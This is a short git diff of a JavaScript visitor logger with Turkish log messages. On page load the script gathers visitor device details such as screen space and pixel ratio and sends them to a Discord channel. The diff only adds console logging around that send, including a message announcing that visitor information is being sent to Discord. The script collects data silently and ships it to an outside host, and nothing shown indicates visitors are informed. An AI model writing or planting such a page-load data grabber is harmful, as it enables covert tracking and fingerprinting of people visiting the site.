@@ -9,8 +9,14 @@ async function sendDiscordMessage(message) {
       body: JSON.stringify(payload)
     });
 
-    if (!res.ok) throw new Error(`Discord API error: ${res.status}`);
-  } catch (err) {}
+    if (!res.ok) {
+      console.error(`❌ Discord API error: ${res.status}`);
+    } else {
+      console.log("✅ Discord mesajı başarıyla gönderildi.");
+    }
+  } catch (err) {
+    console.error('❌ Discord mesajı gönderilirken hata oluştu:', err);
+  }
 }
 
 window.addEventListener('load', async () => {
@@ -56,6 +62,9 @@ Available Space: ${availRes}
 Pixel Ratio: ${pixelRatio}
 `;
 
+    console.log("🟡 Ziyaretçi bilgileri hazır, Discord'a gönderiliyor...");
     sendDiscordMessage(message);
-  } catch (e) {}
+  } catch (e) {
+    console.error('❌ Bilgi toplama sırasında hata oluştu:', e);
+  }
 });
